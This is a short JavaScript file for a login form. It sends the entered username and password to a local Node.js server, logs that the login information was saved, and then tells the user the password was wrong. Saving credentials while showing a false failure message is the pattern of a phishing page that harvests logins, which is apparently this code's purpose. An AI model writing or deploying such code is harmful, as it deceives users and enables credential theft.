function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

    // Send data to your Node.js server
    fetch('http://localhost:3000/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      })
      .then(response => response.text()) // Use text() because you are sending a plain response in server.js
      .then(data => {
        console.log("Login information saved!");
        console.log(data);  // Log the response for debugging purposes
        clearData(); // Optionally clear the data after success
      })
      .catch(error => {
        console.error("Error:", error);
        wrongPassMessage.innerText = "Something went wrong. Please try again later.";
      });
    }

const wrongPassMessage = document.querySelector('.wrongPass');
function clearData() {

    // Clear the username and password fields
    document.getElementById('username').value = "";
    document.getElementById('password').value = "";
    wrongPassMessage.innerText = "Wrong Password or Username. Please try again";  
}
